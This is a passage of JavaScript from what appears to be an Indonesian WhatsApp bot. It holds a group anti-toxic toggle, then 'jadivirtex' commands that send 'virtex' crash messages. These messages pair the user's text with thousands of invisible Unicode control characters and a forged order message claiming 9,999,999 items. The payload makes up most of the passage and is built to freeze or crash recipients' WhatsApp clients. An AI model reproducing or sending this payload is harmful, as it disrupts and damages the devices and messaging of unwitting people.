					if (args.length < 1) return reply(`untuk mengaktifkan ketik : ${prefix}antitoxic 1`)
					if (Number(args[0]) === 1) {
						if (isToxic) return reply('Sudah Aktif dev')
						antitoxic.push(from)
						fs.writeFileSync('./database/antitoxic.json', JSON.stringify(antitoxic))
						reply('_Success mengaktifkan anti toxic digroup ini!_')
					} else if (Number(args[0]) === 0) {
						if (!isToxic) return reply('Sudah Mati ')
						var ini = antitoxic.indexOf(from)
						antitoxic.splice(ini, 1)
						fs.writeFileSync('./database/antitoxic.json', JSON.stringify(antitoxic))
						reply('_Success mematikan anti toxic digroup ini!_')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk mematikan')
					}
					break
  case 'jadivirtexv2':
   if (!q) return reply(`Teks?`)
   textt = `${q}                                                            ${q}@                                                                  
${jadivirtex1}
`
zoe.sendMessage(from, textt, text, {quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'zoe️',
    orderTitle: 'bugdoc〽', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }})
break
case 'jadivirtex':
   if (!q) return reply(`Teks?`)
   textt = `${q}                                                            ${q}@                                                                  
★‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎